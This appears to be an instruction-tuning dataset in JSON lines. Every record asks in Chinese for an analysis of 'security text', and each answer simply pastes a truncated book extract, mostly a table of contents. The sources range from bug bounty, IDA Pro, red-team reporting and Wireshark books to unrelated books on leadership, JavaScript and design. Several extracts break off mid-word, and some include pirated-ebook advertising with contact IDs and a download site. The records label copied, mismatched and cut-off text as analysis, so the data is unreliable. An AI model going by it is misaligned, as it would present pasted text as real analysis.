{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nCover Title Page Copyright About the Author Foreword Introduction Who This Book Is For What Is In This Book Happy Hacking! Part I: The Industry Chapter 1: Picking a Bug Bounty Program The State of the Industry Asset Types Social Sites and Applications General Web Applications Mobile Applications (Android, iOS, and Windows) APIs Source Code and Executables Hardware and IoT Bug Bounty Platforms The Pros . . . . . . and the Cons Scope, Payouts, and Response Times Program Scope Payout Amounts Response Time Private Programs Choosing the Right Program A Quick Comparison of Popular Programs Chapter 2: Sustaining Your Success Writing a Good Report Step 1: Craft a Descriptive Title Step 2: Provide a Clear Summary Step 3: Include a Severity Assessment Step 4: Give Clear Steps to Reproduce Step 5: Provide a Proof of Concept Step 6: Describe the Impact and Attack Scenarios Step 7: Recommend Possible Mitigations Step 8: Validate the Report Additional Tips for Writing Better Reports Building a Relationship with the Development Team Understanding Report States Dealing with Conflict Building a Partnership Understanding Why Youre Failing Why Youre Not Finding Bugs Why Your Reports Get Dismissed What to Do When Youre Stuck Step 1: Take a Break! Step 2: Build Your Skill Set Step 3: Gain a Fresh Perspective Lastly, a Few Words of Experience Part II: Getting Started Chapter 3: How the Internet Works The Client-Server Model The Domain Name System Internet Ports HTTP Requests and Responses Internet Security Controls Content Encoding Session Management and HTTP Cookies Token-Based Authentication JSON Web Tokens The Same-Origin Policy Learn to Program Chapter 4: Environmental Setup and Traffic Interception Choosing an Operating System Setting Up the Essentials: A Browser and a Proxy Opening the Embedded Browser Setting Up Firefox Setting Up Burp Using Burp The Proxy The Intruder The Repeater The Decoder The Comparer Saving Burp Requests A Final Note on . . . Taking Notes Chapter 5: Web Hack", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n版权信息 书名IDA Pro权威指南第2版 作者Chris Eagle 译者石华耀 段桂菊 ISBN978-7-115-27368-0 本书由北京图灵文化发展有限公司发行数字版版权所有侵权必究 您购买的图灵电子书仅供您个人使用未经授权不得以任何方式复制和传播本书内容 我们愿意相信读者具有这样的良知和觉悟与我们共同保护知识产权 如果购买者有侵权行为我们可能对该用户实施包括但不限于关闭该帐号等维权措施并可能追究法律责任 目录 版权声明 献词 对上一版的赞誉 致谢 前言 第一部分 IDA简介 第1章 反汇编简介 1.1 反汇编理论 1.2 何为反汇编 1.3 为何反汇编 1.4 如何反汇编 1.5 小结 第2章 逆向与反汇编工具 2.1 分类工具 2.2 摘要工具 2.3 深度检测工具 2.4 小结 第3章 IDA Pro 背景知识 3.1 Hex-Rays公司的反盗版策略 3.2 获取IDA Pro 3.3 IDA 支持资源 3.4 安装IDA 3.5 IDA 用户界面 3.6 小结 第二部分 IDA基本用法 第4章 IDA入门 4.1 启动IDA 4.2 IDA 数据库文件 4.3 IDA 桌面简介 4.4 初始分析时的桌面行为 4.5 IDA 桌面提示和技巧 4.6 报告bug 4.7 小结 第5章 IDA 数据显示窗口 5.1 IDA 主要的数据显示窗口 5.2 次要的IDA 显示窗口 5.3 其他IDA 显示窗口 5.4 小结 第6章 反汇编导航 6.1 基本IDA 导航 6.2 栈帧 6.3 搜索数据库 6.4 小结 第7章 反汇编操作 7.1 名称与命名 7.2 IDA 中的注释 7.3 基本代码转换 7.4 基本数据转换 7.5 小结 第8章 数据类型与数据结构 8.1 识别数据结构的用法 8.2 创建IDA 结构体 8.3 使用结构体模板 8.4 导入新的结构体 8.5 使用标准结构体 8.6 IDA TIL 文件 8.7 C++ 逆向工程基础 8.8 小结 第9章 交叉引用与绘图功能 9.1 交叉引用 9.2 IDA 绘图 9.3 小结 第10章 IDA的多种面孔 10.1 控制台模式IDA 10.2 使用IDA 的批量模式 10.3 小结 第三部分 IDA高级应用 第11章 定制IDA 11.1 配置文件 11.2 其他IDA 配置选项 11.3 小结 第12章 使用FLIRT 签名来识别库 12.1 快速库识别和鉴定技术 12.2 应用FLIRT 签名 12.3 创建FLIRT 签名文件 12.4 小结 第13章 扩展IDA 的知识 13.1 扩充函数信息 13.2 使用loadint 扩充预定义注释 13.3 小结 第14章 修补二进制文件及其他IDA 限制 14.1 隐藏的补丁程序菜单 14.2 IDA 输出文件与补丁生成 14.3 小结 第四部分 扩展IDA的功能 第15章 编写IDA 脚本 15.1 执行脚本的基础知识 15.2 IDC 语言 15.3 关联IDC 脚本与热键 15.4 有用的IDC 函数 15.5 IDC 脚本示例 15.6 IDAPython 15.7 IDAPython 脚本示例 15.8 小结 第16章 IDA 软件开发工具包 16.1 SDK简介 16.2 IDA 应用编程接口 16.3 小结 第17章 IDA 插件体系结构 17.1 编写插件 17.2 构建插件 17.3 插件安装 17.4 插件配置 17.5 扩展IDC 17.6 插件用户界面选项 17.7 脚本化插件 17.8 小结 第18章 二进制文件与 IDA 加载器模块 18.1 未知文件分析 18.2 手动加载一个Windows PE文件 18.3 IDA 加载器模块 18.4 使用SDK编写IDA 加载器 18.5 其他加载器策略 18.6 编写脚本化加载器 18.7 小结 第19章 IDA 处理器模块 19.1 Python字节码 19.2 Python解释器 19.3 使用SDK编写处理器模块 19.4 构建处理器模块 19.5 定制现有的处理器 19.6 处理器模块体系结构 19.7 编写处理器模块 19.8 小结 第五部分 实际应用 第20章 编译器变体 20.1 跳转表与分支语句 20.2 RTTI实现 20.3 定位main函数 20.4 调试版与发行版二进制文件 20.5 其他调用约定 20.6 小结 第21章 模糊代码分析 21.1 反静态分析技巧 21.2 反动态分析技巧 21.3 使用IDA 对二进制文件进行静态去模糊 21.4 基于虚拟机的模糊 21.5 小结 第22章 漏洞分析 22.1 使用IDA 发现新的漏洞 22.2 使用IDA 在事后发现漏洞 22.3 IDA 与破解程序开发过", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n第10章 赛后分析报告 第10章 赛后分析报告 译者@Snowming 在之前的 THP 书籍中我们有介绍如何编写渗透测试报告的示例并提供了大量报告模板这些示例非常适合那些按部就班的做渗透测试的活动但是不适合红队的活动正如本书所述红队的焦点不是识别漏洞本身虽然这也是工作的一部分而是测试人工具工作流程和员工的技能组合如果你的公司被授权的渗透测试者或者未授权的坏人攻击并成功入侵你会给自己的业绩打几分我一直反对使用差距评估分数ISO 分数成熟度模型分数标准风险分析热度图和类似类型的报告来展示公司安全项目的真实状况 就我个人而言我喜欢看到公司从之前的红队活动中采取措施进行控制以测试是否真的取得了进展例如对于一个使用了近似域名方法的网络钓鱼活动我们看到公司启用了以下一些功能 使用 dnstwist 对与其公司类似的域名发出警报 设置一个外部电子邮件域的可信列表任何与之不匹配的外部邮件都将在最终用户可见的电子邮件中附加一个标题说明它是外部非公司的未经批准的电子邮件源这将帮助你的用户更容易识别网络钓鱼 来自代理中未分类的域的电子邮件中的任何链接至少应单击一次并警告用户改链接未分类 禁止 Office 宏附件强制使用受保护的视图和对文档进行沙盒处理 这只是一个公司可以实施的可以阻止攻击的一些简单方法 请记住红队人员只需要找到一个漏洞就可能破坏整个内网环境但是蓝队成员只需要识别攻击者的 TTP战术技术和过程之一就可以阻止这威胁因此现在的问题是如果这些 TTP 中的一个已经引起防御系统发出警报你的应急响应团队发现警报并处理威胁的速度有多快所以红队风格的报告应该包括哪些内容呢由于红队这个概念还很新目前还没有标准的报告模板我们可以根据客户的需求进行定制在我看来因为我们可能会在一个完整的红队活动中多次尝试进入一个内网环境(且被抓住几次)所以我们想要把好的方面和不好的方面都在报告中都展示出来 在活动期间记笔记方面许多工具如 Empire 和 Cobalt Strike 在红队活动期间都有很好的活动日志记录但这些可能还远远不够我发现对我们团队的活动非常有用的是建立一个简单的 Web 服务器来记录红队成员执行的每个操作记录过程中只收集最基本的信息其中包括特定的事件服务器描述影响任何警报和屏幕截图大多数红队/渗透测试人员都不喜欢做笔记但这类记录提供了一种简单的跟踪活动的方法 一旦活动结束我们将收集所有笔记并将其组合在一起以构建一个能讲述故事的红队报告红队报告的主要组成部分可能包括 简介/范围本节需要明确说明活动的目标例如有些客户要求我们访问特定的数据获得域管理权限获取 PII个人身份信息获取 IP 或在找到他们的生产环境的服务器的标志flag 指标在一场交战之后获得攻击报告是对应急响应团队/取证团队非常有帮助的我们还想确定他们的防范工具或安全传感器可能遗漏的地方那些使他们无法执行取证或检测恶意活动的纰漏因此我们希望给出C2服务器的IP地址使用的域名二进制文件的 MD5/SHA1 哈希电子邮件地址和 IP 信息被钓鱼的受害者列表以及任何其他可能有助于取证/应急响应团队的信息 攻击时间轴这是红队行动中最重要的部分之一做好笔记是有回报的时间轴应该充分说明所有的主要活动任何触发警报的 TTP以及主要的活动这将允许蓝队比较他们的时间轴和笔记看看他们错过了什么在一次真正的攻击中你有机会询问那些坏人关于他们做的每坏件事吗这对防守团队来说是非常有利的一个时间轴示例可能是这样的: 检测时间TTD/解决时间TTM这通常是我们可以使用蓝队报告构建 TTD/TTM 统计数据的地方我们都想要确定蓝队发现一次多重入侵所需的时间扫描事件触发调查之前花费的时间如果调查了的话以及蓝队需要多长时间来识别网络钓鱼活动 第二部分应该讨论有关采取行动之前花费的时间的统计数据如果有已警告的 C2 通信或已识别的网络钓鱼那么在防火墙或 DNS 服务器上封锁这些域需要花费的时间是多久我们经常看到公司可能擅长屏蔽域名但是当 C2 服务器通过 IP 进行通信时会很快失败反之亦然我们希望确保跟踪此活动并帮我们的客户来识别它另一个很有用的 TTM 衡量标准是他们最快的情况下要花多久来隔离一个已经确认受损的系统随着恶意软件变得越来越自动化我们需要开始利用智能化和自动化的流程将系统或网络的一部分与组织的其他部分隔离开来 来自应急响应/应急人员的反馈我最喜欢记录的东西之一是来自蓝队的反馈他们是如何从防守的角度看待整个活动的我想知道的是他们是否觉得自己遵守了安全政策事件负责人是否推动了调查管理层是否过度介入安全部门如何与 IT 部门进行安全方面的互动从而促进任何与 IT 相关的改变防火墙屏蔽DNS 修改等等以及他们中间的哪些人过于慌张哪些人过于冷静 如前所述红队的目的不是寻找漏洞或破坏环境尽管这是非常有趣的部分而是改善客户", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nTable of Contents Cover Foreword Introduction CHAPTER 1: Fundamental Networking and Security Tools Ping IPConfig NSLookup Tracert NetStat PuTTY CHAPTER 2: Troubleshooting Microsoft Windows RELI PSR PathPing MTR Sysinternals The Legendary God Mode CHAPTER 3: NmapThe Network Mapper Network Mapping Port Scanning Services Running Operating Systems Zenmap CHAPTER 4: Vulnerability Management Managing Vulnerabilities OpenVAS Nexpose Community CHAPTER 5: Monitoring with OSSEC LogBased Intrusion Detection Systems Agents Log Analysis CHAPTER 6: Protecting Wireless Communication 802.11 inSSIDer Wireless Network Watcher Hamachi Tor CHAPTER 7: Wireshark Wireshark OSI Model Capture Filters and Colors Inspection CHAPTER 8: Access Management AAA Least Privilege Single SignOn JumpCloud CHAPTER 9: Managing Logs Windows Event Viewer Windows PowerShell BareTail Syslog SolarWinds Kiwi CHAPTER 10: Metasploit Reconnaissance Installation Gaining Access Metasploitable2 Vulnerable Web Services Meterpreter CHAPTER 11: Web Application Security Web Development Information Gathering DNS Defense in Depth Burp Suite CHAPTER 12: Patch and Configuration Management Patch Management Configuration Management Clonezilla Live CHAPTER 13: Securing OSI Layer 8 Human Nature Human Attacks Education The Social Engineer Toolkit CHAPTER 14: Kali Linux Virtualization Optimizing Kali Linux Using Kali Linux Tools CHAPTER 15: CISv7 Controls and Best Practices CIS Basic ControlsThe Top Six In Conclusion Index End User License Agreement List of Tables Chapter 1 Table 1.1: ping command syntax Chapter 3 Table 3.1: Top Ports Defined Chapter 4 Table 4.1: CVSS v3.0 Ratings Chapter 6 Table 6.1: IEEE 802.11 standards Table 6.2: Wireless Network Watcher commandline options Chapter 7 Table 7.1: Keyboard shortcuts for Wireshark Table 7.2: Filter operators Table 7.3: Expert Info severity levels Chapter 9 Table 9.1: Ports used by Kiwi Syslog Server Chapter 14 Table 14.1: Resource requirements for Windows 10, Ubuntu, and Kali Lin", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n横向领导力美费希尔美夏普 著刘清山 译 版权信息书名横向领导力作者美费希尔美夏普译者刘清山书号ISBN 978-7-5502-6265-2版权后浪出版咨询北京有限责任公司 目录引言 任何人都是潜在的领导者第一部分 真正的领导者不需要职位01 合作很难你还没找到方法02 横向领导怎样巧妙地影响他人第二部分 做对5步团队就是你的了03 目标整理术把团队拧成一股绳04 思考整理术迅速找到解决问题的方法05 计划修正术不断修正计划使其趋于完美06 激励管理术让团队成员保持专注07 反馈的艺术不断提升团队工作效率第三部分 做更好的领导者08 五项技能的综合运用09 假如你是领导者你还能做什么10 敢于站出来的人就是领导者致 谢[最新电子书免费分享社群群主V信 1107308023 添加备注电子书]出版后记 引言 任何人都是潜在的领导者如果你曾经以缺乏组织的方式与他人共同工作并且遇到了问题感到非常沮丧那么本书就是为你而写的你很可能经历过下面的情形乔我一直在考虑这项工作我非常清楚应该如何去做萨莉等一下首先我想知道为什么我们要做这项工作乔很明显老板对目前的局面很不满查理这个理由很充分不过在开始之前我想先制订一份时间表比尔好的这项工作的截止日期是哪一天克里斯蒂娜在研究这个问题之前我想问问这项工作有人负责吗比尔你的意思是你想成为负责人克里斯蒂娜不是的我只是问是否有人负责如果没有的话是不是应该先找一个负责人乔我不知道你们的情况怎么样不过我不可能把所有的时间花在这项工作上我还有许多别的事情要做萨莉我现在还不知道我们要做的是什么按照上面这种趋势发展下去你可能取得一定的进展也可能是虚掷光阴几乎每个人在下班时都会抱怨他们浪费了许多时间却没有取得什么成果这种局面你很可能经历过不计其数这并不能说明你的表现不好事实上我们每个人都经历过这样的局面考虑前面的例子这个团队需要什么呢通常的回答是领导他们当中没有负责人所以不怪他们的工作不到位根据我们的经验有权威的领导可以做许多事情但默契无间的合作绝不是命令出来的本书的写作目的就是帮助你与他人合作完成艰巨的工作任务它所着眼的并不是有权威的领导能做什么而是你能做什么不是所有可能实现的目标而是良好合作的目标你与他人同舟共济时取得良好结果的目标要想让你的同事朝着正确的方向前进你首先必须清楚应该朝哪个方向前进讲一个比较经典的故事铁路公司有一辆崭新的柴油机车出了故障不管工程师怎么做都无法让机车启动他们请来了一位专家专家对情况进行了研究然后用锤子轻轻敲了机车一下列车就启动了专家开出了一千美元的账单铁路公司要求他对账单作出解释专家的回复是用锤子敲打机车10美元知道敲打部位990美元帮助团队实现良好的合作与此类似你最后所采取的行动只是整个解决过程的一小部分不管你是不是领导我们都建议你把自己想象成一个潜在领导者在实践中你会发现通过使用我们所说的横向领导能力你完全可以让局面朝着更好的方向发展本书的目标就是让你有能力与你的同事实现高质量的合作取得高质量的结果你无须拥有高于同事的权力只需要使用横向领导方法就可以如鱼得水横向领导方法包含三个基本步骤第一步是培养和锻炼独自工作的个人能力第二步是对你与他人有组织地共同工作这个战略目标获得清晰的理解第三步是学习一些参与式领导方法通过这些方法你作为团队的普通一员也能使用提问作答行动的方式促使他人更好地共同工作以意图改善乐队演奏效果的爵士乐手为例形象地说明以上三个步骤首先这个乐手需要培养自己的独奏技能接着他需要理解优秀的爵士乐合奏应当具有的特点和声对位以及哪种伴奏对主旋律的衬托效果更好搞定这一切他才能采取行动领导乐队成员改善乐队的演奏效果我们相信任何企业组织委员会或其他团体中的人读了本书以后都可以改善团队共同工作的方式取得理想的结果 第一部分真正的领导者不需要职位 01 合作很难你还没找到方法不管你是企业主管团队成员服务人员咨询人员还是政府官员都无法完全依靠个人力量实现所有的目标你无时无刻不在依靠下属同事上级供应商客户的帮助就连才华横溢的诗人也需要同编辑和出版商打交道除非你是一个隐士否则光靠你一个人的力量是做不成什么事的因此你必须与他人合作可是与人合作是非常困难的流水线上的机器人可以精准地相互配合完成工作人类却做不到这一点每个人都有自己的思想而且与机器人不同难免受情绪左右有时快乐有时愤怒有时自信爆棚有时忧心忡忡有时与人为善有时却又心生嫉妒此外我们每个人还会对情形公正与否作出迥异的判断因此当许多人共同工作时往往会问题连连[最新电子书免费分享社群群主V信 1107308023 添加备注电子书]两个常见的问题合作不佳大部分人在与他人合作时都会感到非常沮丧因为他们往往付出极大的精力却收效甚微合作是不同方法与思想的某种结合每个人在工作时都需要用到经验直觉与习惯但这些因素却因人而异这当然是一种巨大的资源可以提供多元的思想", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n目 录 版权信息 作者简介 封面介绍 版权声明 内容提要 译者简介 要感谢的人 对本书的赞誉 前言 阅前须知 本书读者对象 未涵盖内容 本书结构 本书使用的JavaScript版本 阅前建议 本书的四部分内容 JavaScript命令行 符号说明 快速查询文档 Safari Books Online 联系我们 致谢 审稿人 第1部分 JavaScript快速上手 第1章 基础JavaScript 1.1 背景 1.1.1 JavaScript与ECMAScript 1.1.2 JavaScript的影响和本质 1.2 语法 1.2.1 语法概述 1.2.2 语句和表达式 1.2.3 分号 1.2.4 注释 1.3 变量和赋值 1.3.1 赋值 1.3.2 复合赋值运算符 1.3.3 标识符与变量名 1.4 值 1.4.1 原始值和对象 1.4.2 原始值 1.4.3 对象 1.4.4 undefined和null 1.4.5 使用typeof和instanceof对值分类 1.5 布尔值 1.5.1 真值与假值 1.5.2 二元逻辑运算符 1.5.3 等式运算符 1.6 数字 1.7 运算符 1.8 字符串 1.8.1 字符串运算符 1.8.2 字符串方法 1.9 语句 1.9.1 条件语句 1.9.2 循环语句 1.10 函数 1.10.1 函数声明的提升特性 1.10.2 特殊的变量arguments 1.10.3 参数太多或太少 1.10.4 可选参数 1.10.5 强制参数长度 1.10.6 将arguments转换为数组 1.11 异常捕获 1.12 严格模式 1.13 变量作用域和闭包 1.13.1 变量是函数作用域的 1.13.2 变量的提升特性 1.13.3 闭包 1.13.4 IIFE模式引入一个新的作用域 1.14 对象和构造函数 1.14.1 单一对象 1.14.2 任意属性名 1.14.3 提取方法 1.14.4 方法中的函数 1.14.5 构造函数对象工厂 1.15 数组 1.15.1 数组字面量 1.15.2 数组方法 1.15.3 遍历数组 1.16 正则表达式 1.16.1 test()方法匹配吗 1.16.2 exec()方法匹配以及捕获分组 1.16.3 replace()方法搜索和替换 1.17 Math 1.18 标准库的其他功能 第2部分 背景 第2章 为什么选择JavaScript 2.1 JavaScript可以自由使用吗 2.2 JavaScript优雅吗 2.3 JavaScript有用吗 2.3.1 图形用户界面 2.3.2 其他技术补充完善JavaScript 2.4 JavaScript有什么好用的工具吗 2.5 JavaScript是否足够快 2.6 JavaScript是广泛使用的吗 2.7 JavaScript有前途吗 2.8 结论 第3章 JavaScript的性质 3.1 古怪和非官方特性 3.2 优雅部分 3.3 影响 第4章 JavaScript是如何创造出来的 第5章 标准化ECMAScript 第6章 JavaScript的历史里程碑 第3部分 深入JavaScript 第7章 JavaScript的语法 7.1 语法概览 7.2 注释 7.3 表达式与语句 7.3.1 表达式 7.3.2 语句 7.4 控制流语句和块 7.5 使用分号的规则 7.5.1 以块结束的语句后面没有分号 7.5.2 空语句 7.5.3 自动分号插入 7.6 合法标识符 7.7 数字字面量的方法调用 7.8 严格模式 7.8.1 启用严格模式 7.8.2 严格模式建议与注意事项 7.8.3 严格模式中变量必须被声明 7.8.4 严格模式下的函数 7.8.5 严格模式中设置或者删除不可改变的属性会抛出异常 7.8.6 严格模式中的不合格标识符不能删除 7.8.7 严格模式中eval更加简洁 7.8.8 严格模式中禁用的特性 第8章 值 8.1 JavaScript中的类型体系 8.1.1 JavaScript类型 8.1.2 静态与动态 8.1.3 静态类型与动态类型 8.1.4 静态类型检查和动态类型检查 8.1.5 强制转换 8.2 原始值和对象 8.2.1 原始值 8.2.2 对象 8.3 undefined和null 8.3.1 undefined和null的出现场景 8.3.2 检测undefined和null 8.3.3 undefined和null的历史 8.3.4 修改undefined 8.4 原始值的包装对象 8.4.1 包装对象不同于原始值 8.4.2 原始值的包装与去包装 8.4.3 原始值从包装器借调方法 8.5 强制类型转换 8.5.1 强制类型转换会", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n15.设计与研究 外国游客常常惊讶地发现美国人交谈的时候一开始总是问你干什么工作我一直讨厌回答这个问题因为一句话说不清楚不过我最终找到了解决方法现在如果有人问我干什么工作我会正规对方的双眼说我正在设计一种Lisp语言的新方言如果你也有同样困扰我推荐你也如此回答对方就立刻转向其他话题了 我确实是在设计一种编程语言而且我不认为自己在做研究我所做的工作与其他人设计一幢大楼一把椅子一种新字体并没有本质不同我的目的不是发现一种新东西而是做出一种很好的编程语言 设计与研究的区别看来就在于前者追求好good后者追求新new优秀的设计不一定很新但必须是好的优秀的研究不一定很好但必须是新的我认为这两条道路最后会发生交叉只有应用新的创意和理论才会诞生超越前人的最佳设计只有解决那些值得解决的难题也就是好的难题才会诞生最佳研究所以最终来说设计和研究都通向同一个地方只是前进的路线不同罢了 如果把创造一种编程语言看成是设计问题而不是科研方向那么有何不同 最大的不同在于你会更多地考虑用户设计的时候一开始总是问我为谁设计他们需要什么比如优秀的建筑师不会先设计然后强迫用户接受而是先研究最终用户的需求然后做出用户需要的设计 注意我说的是用户需要的设计而不是用户要求的设计我不想让读者产生一种印象认为设计师就像厨师一样顾客点什么菜就一模一样做出来艺术的各个领域有着巨大的差别但是我觉得任何一个领域的最佳作品都不可能由对用户言听计从的人做出来 有一句话说顾客永远是对的这是指评价优秀设计的标准是看它能够多大程度上满足用户的需求如果你的小说没人爱看或者你做的椅子极不舒服那么就说明你的作品失败了被一票否决了就算你的小说或者椅子有着最先进的理论指导也无济于事 可是让用户满意并不等于迎合用户的一切要求用户不了解所有可能的选择也经常弄错自己真正想要的东西做一个好的设计师就像做一个好医生一样你不能头痛医头脚痛医脚病人告诉你症状你必须找出他生病的真正原因然后针对病因进行治疗 大多数优秀设计都是这样产生的它们关注用户并且以用户为中心 我说设计必须考虑用户的需求这里的用户并不是指所有普罗大众事实上你可以选择任何想要的目标用户比如假定你正在设计一种工具你可以把目标用户定为初学者也可以定为专家级用户一种人眼里的优秀设计可能在另一种人眼里却是糟糕无比这里的重点是你必须选出某些人作为你的目标用户我觉得除非设定目标用户否则一种设计的好坏根本无从谈起 如果目标用户群体涵盖了设计师本人那么最有可能诞生优秀设计如果目标用户与你本人差别很大你往往会假定目标用户的需求比你本人的需求更简单而不是更复杂低估用户即使出于善意一般来说总是会让设计师出错我怀疑那些设计公共住宅项目housing project的建筑师根本没想过自己住在里面会是什么感觉编程语言也有这种现象CLisp和Smalltalk都是设计者为了自己使用而设计的而CobolAda和Java则是为了给别人使用而设计的 公共住宅指的是由政府出资建造的房产用来出租给低收入家庭居住类似于廉租房译者注 如果你觉得自己在为傻瓜设计产品那么很可能不仅无法设计出优秀产品而且就连傻瓜也不喜欢你的设计 不过就算你的设计针对的是最高端的用户你也一样是设计给人类使用研究就不一样了做数学研究时你不会只为了方便读者理解而故意选择一种更麻烦的证明方式你只会选择最直接最简洁的证明我想一般来说科学研究都是这样科学观点不需要服从人类工程学ergonomic 到了艺术领域情况就完全变了设计必须以人为本设计椅子的时候你不能只考虑椅子还必须考虑人体各种千奇百怪的特点不可能回避掉这一点所有的艺术都必须迎合人类的兴趣和极限举例来说不考虑其他因素时肖像画就是比风景画更能引发观众的兴趣文艺复兴时期的经典绘画作品都是画人的这并非巧合如果绘画艺术不能用来表现人类本身那么绘画也不会成为今天这样受推崇的艺术形式了 不管你喜不喜欢编程语言也是以人为本的我怀疑人类的大脑与躯干一样都有着许多令人琢磨不透的特点否则为什么有些事情人类特别擅长而另一些事情人类干起来特别困难比如人类似乎不善于处理精细的工作所以最好还是交给计算机处理另一方面如果人类真的擅长和细节打交道那么我们应该都用机器语言编程才对 另外还要记住一点怎么理解编程语言你不要把它看成那些已完成的程序的表达方式而应该把它理解成促进程序从无到有的一种媒介这里的意思是说成品的材料和开发时用的材料其实是不一样的搞艺术的人都知道这两个阶段往往需要不同的媒介比如大理石是一种非常良好耐用的材料很适合用于最后的成品但是它极其缺乏弹性和灵活性所以不适合在构思阶段用来做模型 最后写出来的程序就像已经完成的数学证明一样是一棵经过精心修剪的树木上面杂乱滋生的树杈都已经被剪去了所以评价一种语言的优劣不能简单地看最后的程序是否表达得很漂亮而要看程序从无到有的那条完成路径是否很漂亮某种设计", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n如果你不知道读什么书或者想获得更多免费电子书请加小编QQ2338856113 小编也和结交一些喜欢读书的朋友 或者关注小编个人微信公众号名称幸福的味道 获得上百个书单 为了方便书友朋友找书和看书小编自己做了一个电子书下载网站网址http://www.ireadweek.com 如于某种原因经常换网址 如果打不开可以qq联系我 网络空间安全技术丛书 企业安全建设指南金融行业安全架构与技术实践 聂君 李燕 何扬军 编著 ISBN978-7-111-62203-1 本书纸版由机械工业出版社于2019年出版电子版由华章分社北京华章图文信息有限公司北京奥维博世图书发行有限公司全球范围内制作与发行 版权所有侵权必究 客服热线+ 86-10-68995265 客服信箱service@bbbvip.com 官方网址www.hzmedia.com.cn 新浪微博 @华章数媒 微信公众号 华章电子书微信号hzebook 目录 对本书的赞誉 序一 序二 序三 前言 第一部分 安全架构 第1章 企业信息安全建设简介 1.1 安全的本质 1.2 安全原则 1.3 安全世界观 1.4 正确处理几个关系 1.5 安全趋势 1.6 小结 第2章 金融行业的信息安全 2.1 金融行业信息安全态势 2.2 金融行业信息安全目标 2.3 信息安全与业务的关系矛盾与共赢 2.4 信息安全与监管的关系约束与保护 2.5 监管科技 2.6 小结 第3章 安全规划 3.1 规划前的思考 3.2 规划框架 3.3 制订步骤 3.3.1 调研 3.3.2 目标现状和差距 3.3.3 制订解决方案 3.3.4 定稿 3.3.5 上层汇报 3.3.6 执行与回顾 3.4 注意事项 3.5 小结 第4章 内控合规管理 4.1 概述 4.1.1 合规内控风险管理的关系 4.1.2 目标及领域 4.1.3 落地方法 4.2 信息科技风险管理 4.2.1 原则 4.2.2 组织架构和职责 4.2.3 管理内容 4.2.4 管理手段和流程 4.2.5 报告机制 4.2.6 信息科技风险监控指标 4.3 监督检查 4.4 制度管理 4.5 业务连续性管理 4.5.1 定义和标准 4.5.2 监管要求 4.5.3 BCM实施过程 4.5.4 业务影响分析和风险评估 4.5.5 BCP演练和改进 4.5.6 DRI组织及认证 4.6 信息科技外包管理 4.7 分支机构管理 4.8 信息科技风险库示例 4.9 小结 第5章 安全团队建设 5.1 安全团队建设的痛点 5.2 安全团队面临的宏观环境 5.3 安全团队文化建设 5.4 安全团队意识建设 5.5 安全团队能力建设 5.5.1 确定目标找准主要矛盾 5.5.2 梳理和细分团队职能 5.5.3 建立学习框架提升知识和技能水平 5.5.4 掌握学习方法实现事半功倍的效果 5.6 安全团队建设路径 5.7 安全人员职业规划 5.8 安全团队与其他团队的关系处理 5.9 小结 第6章 安全培训 6.1 安全培训的问题与痛点 6.1.1 信息安全意识不足的真实案例 6.1.2 信息安全培训的必要性 6.1.3 信息安全培训的痛点 6.2 信息安全培训关联方 6.3 信息安全培训百宝箱 6.4 面向对象的信息安全培训矩阵 6.5 培训体系实施的效果衡量 6.6 小结 第7章 外包安全管理 7.1 外包安全管理的问题与痛点 7.1.1 几个教训深刻的外包风险事件 7.1.2 外包安全管理的必要性 7.1.3 外包管理中的常见问题 7.2 外包战略体系 7.3 外包战术体系 7.3.1 事前预防 7.3.2 事中控制 7.3.3 事后处置 7.4 金融科技时代的外包安全管理 7.5 小结 第8章 安全考核 8.1 考核评价体系与原则 8.2 安全考核对象 8.3 考核方案 8.3.1 考核方案设计原则 8.3.2 总部IT部门安全团队 8.3.3 总部IT部门非安全团队平行团队 8.3.4 个人考核 8.3.5 一些细节 8.4 与考核相关的其他几个问题 8.5 安全考核示例 8.6 小结 第9章 安全认证 9.1 为什么要获得认证 9.2 认证概述 9.2.1 认证分类 9.2.2 认证机构 9.3 选择什么样的认证 9.4 如何通过认证 9.5 小结 第10章 安全预算总结与汇报 10.1 安全预算 10.2 安全总结 10.3 安全汇报 10.4 小结 第二部分 安全技术实战 第11章 互联网应用安全 11.1 端口管控 11.2 Web应用安全 11.3 系统安全 11.4 网络安全 11.5 数据安全 11.6 业务安全 11.7 互联网DMZ区安全管控标准 11.8 小结 第12章 移动应用安全 12.1 概述 12.2 APP开发安全 12.", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n目录 初试锋芒 从一道面试题开始说起 小试牛刀一个简单的应用实例 Excel文件的保存过程 你一定会喜欢的技巧 Patrick的故事 Wireshark的前世今生 庖丁解牛 NFS协议的解析 从Wireshark看网络分层 TCP的连接启蒙 快递员的工作策略TCP窗口 重传的讲究 延迟确认与Nagle算法 百家争鸣 简单的代价UDP 剖析CIFS协议 网络江湖 DNS小科普 一个古老的协议FTP 上网的学问HTTP 无懈可击的Kerberos TCP/IP的故事 举重若轻 一小时内给你答复 午夜铃声 深藏功与名 棋逢对手 学无止境 一个技术男的自白 初试锋芒 从一道面试题开始说起 我每次当面试官都要伪装成无所不知的大牛 这当然是无奈的选择现在每封简历都那么耀眼不装一下简直镇不住场面比如尚未毕业的本科生早就拿下CCIE认证留欧两年的海归已然精通英法德三门外语最厉害的一位应聘者研究生阶段就在国际上首次提出了计算机和生物学的跨界理论可怜我这个老实人在一开场还能装装到了技术环节就忍不住提问基础知识一下子把气氛从学术殿堂拉到建筑工地不过就是这些最基础的问题却常常把简历精英们难住本文要介绍的便是其中的一道 问题两台服务器A和B的网络配置如下见图1B的子网掩码本应该是255.255.255.0被不小心配成了255.255.255.224它们还能正常通信吗 图1 